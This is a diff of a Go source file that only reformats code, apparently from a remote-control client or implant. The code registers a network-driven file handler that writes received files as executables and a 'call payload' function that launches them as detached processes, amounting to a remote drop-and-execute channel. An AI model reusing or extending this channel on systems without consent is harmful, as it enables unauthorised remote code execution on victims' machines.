@@ -4,25 +4,25 @@ package base
 
 import (
 	"net"
-//	"io"
+	//	"io"
 	"os"
 	"os/exec"
 	"syscall"
-//	"sync"
-//	"time"
-//	"bytes"
-//	"io/ioutil"
+	//	"sync"
+	//	"time"
+	//	"bytes"
+	//	"io/ioutil"
 
-	kit "local/toolkit"
 	"lib/smux"
+	kit "local/toolkit"
 )
 
 func init() {
 	RegOps(B_fs, ccFs)
 }
 
-var ccFs = func (op string, p1 net.Conn, c *Client, mux *smux.Session) {
-//	kit.WriteVLen(p1, int64(-2))
+var ccFs = func(op string, p1 net.Conn, c *Client, mux *smux.Session) {
+	//	kit.WriteVLen(p1, int64(-2))
 
 	op2, err := kit.ReadTagStr(p1)
 	if err != nil {
@@ -54,7 +54,7 @@ var ccFs = func (op string, p1 net.Conn, c *Client, mux *smux.Session) {
 		if err != nil {
 			break
 		}
-		fd, err := os.OpenFile(string(fp), os.O_WRONLY | os.O_CREATE | os.O_TRUNC , 0700)
+		fd, err := os.OpenFile(string(fp), os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0700)
 		if err != nil {
 			// can't create file
 			return
@@ -94,12 +94,12 @@ var ccFs = func (op string, p1 net.Conn, c *Client, mux *smux.Session) {
 
 }
 
-var call = func (p1 net.Conn, bin string) {
+var call = func(p1 net.Conn, bin string) {
 	// call payload
 	pl := exec.Command(bin)
 	pl.SysProcAttr = &syscall.SysProcAttr{
 		Setpgid: true,
-//		Noctty: true,
+		//		Noctty: true,
 	}
 	err := pl.Start()
 	if err != nil {
@@ -111,5 +111,3 @@ var call = func (p1 net.Conn, bin string) {
 		p1.Write([]byte(err.Error()))
 	}
 }
-
-
